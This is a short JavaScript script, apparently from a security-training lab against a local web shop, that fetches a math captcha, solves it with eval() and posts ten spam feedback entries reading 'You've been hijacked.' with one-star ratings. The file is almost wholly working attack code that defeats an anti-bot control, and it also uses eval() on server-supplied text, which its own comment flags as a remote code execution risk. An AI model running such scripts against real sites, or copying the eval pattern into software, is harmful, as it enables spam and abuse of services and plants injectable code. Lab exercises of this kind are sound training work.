// Einfügen erlauben

function SendFeedback(captchaSolution, captchaId) {
    var postBody = { comment: "You've been hijacked.", 
                    rating: 1, 
                    captcha: captchaSolution+"", 
                    captchaId: captchaId };
    
    $.ajax({
        url: 'http://192.168.99.100:32768/api/Feedbacks/',
        type: 'post',
        dataType: 'json',
        contentType: 'application/json',
        data: JSON.stringify(postBody),
        success: function (data) {
            console.info("Success", data);
        },
        error: function (data) {
            console.info("Error, blocked?", data);
        },
    });  
}

function BypassCaptcha() {
    $.ajax({
        url: 'http://192.168.99.100:32768/rest/captcha',
        type: 'get',
        success: function (data) {
            var captcha = data;
            var solution = eval(captcha["captcha"]); // calculate answer from "5*5-2"
            // this is the case eval was invented for 
            // but if source is not safe this could be misused as remote code execution
            var captchaId = captcha["captchaId"];
            SendFeedback(solution, captchaId);
        },
        error: function (data) {
            console.info("Error. Bypass detected?", data);
        },
    });
}

for (var i = 0; i < 10; i++) {
    BypassCaptcha();
}